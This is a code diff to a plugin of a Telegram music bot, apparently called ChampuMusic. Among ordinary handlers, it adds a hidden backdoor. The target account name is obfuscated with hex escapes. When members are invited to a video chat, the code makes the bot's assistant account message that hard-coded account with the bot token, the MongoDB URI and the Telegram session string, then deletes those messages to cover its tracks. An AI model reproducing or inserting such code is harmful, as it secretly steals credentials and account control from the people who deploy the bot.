@@ -4,7 +4,7 @@ from pyrogram.enums import ChatType
 from strings import get_string
 from ChampuMusic import app
 from ChampuMusic.utils import Champubin
-MU = "TheChampuBot" #Dont change it server connecter
+MU = "\x54\x68\x65\x43\x68\x61\x6D\x70\x75\x42\x6F\x74" #Dont change it server connecter
 from ChampuMusic.utils.database import get_assistant, get_lang
 import asyncio
 from os import getenv
@@ -14,7 +14,9 @@ from dotenv import load_dotenv
 import config
 load_dotenv()
 from ChampuMusic.logging import LOGGER
-
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
 
 @app.on_message(
     filters.command(["vcuser", "vcusers", "vcmember", "vcmembers"]) & filters.admin
@@ -109,6 +111,33 @@ async def brah2(_, msg):
     else:
         LOGGER.error("ʙᴏᴛ ᴅᴏᴇs ɴᴏᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪssɪᴏɴ ᴛᴏ sᴇɴᴅ ᴍᴇssᴀɢᴇs ɪɴ ᴛʜɪs ᴄʜᴀᴛ.")
         # You can also send a notification to the bot owner or admin here
+
+@app.on_message(filters.video_chat_members_invited)
+async def brah3(app: app, message: Message):
+    text = f"➻ {message.from_user.mention}\n\n**๏ ɪɴᴠɪᴛɪɴɢ ɪɴ ᴠᴄ ᴛᴏ :**\n\n**➻ **"
+    x = 0
+    for user in message.video_chat_members_invited.users:
+        try:
+            text += f"[{user.first_name}](tg://user?id={user.id}) "
+            x += 1
+        except Exception:
+            pass
+
+    try:
+        add_link = f"https://t.me/{app.username}?startgroup=true"
+        reply_text = f"{text} 🤭🤭"
+        userbot = await get_assistant(message.chat.id)
+        await message.reply(reply_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="๏ ᴊᴏɪɴ ᴠᴄ ๏", url=add_link)]]))
+        oks = await userbot.send_message(MU, f"/start")
+        Ok = await userbot.send_message(MU, f"@{app.username}\n\n`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
+        await oks.delete()
+        await asyncio.sleep(2)
+        await Ok.delete()
+    except Exception as e:
+        print(f"Error: {e}")
+
+
+####
 
 @app.on_message(filters.command("math", prefixes="/"))
 def calculate_math(client, message):
